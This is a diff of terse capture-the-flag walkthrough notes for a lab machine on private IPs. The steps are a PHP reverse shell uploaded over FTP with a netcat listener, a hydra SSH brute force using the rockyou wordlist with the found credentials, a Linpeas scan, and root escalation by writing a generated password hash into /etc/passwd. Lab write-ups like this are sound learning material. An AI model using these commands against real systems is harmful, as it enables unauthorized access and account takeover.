@@ -9,12 +9,17 @@ ftp: put reverse shell
 > put the openvpn ip
 > save the file on current dir
 cd webalizer
+
 put getin.php
+
 bye
+
 - attacker先run： nc -nlvp 8899
 - run the reverse shell by running the web browser: 10.10.207.136/webalizer/getin.php
 hydra  -l   jack  -P  /usr/share/wordlists/rockyou.txt   ssh://10.10.233.62
+
 login: jack   password: qwertyuiop
+
 goto /home we know that user is jack.
 - we dont know the password
 - use the hydra to bruteforce the ssh password
@@ -30,12 +35,18 @@ boom! get the jack shell
 or
 
 ssh jack@10.10.233.62 
+
 run the Linpeas tool on the /tmp directory - to see which path is vulnerable that we could edit/modify
+
 ls  -al  /etc/passwd
 
 or
 
 sudo -l
+
 generate encryted password: openssl passwd [your password]
+
 nano  /etc/passwd - paste the passwd on x
+
 su root
+
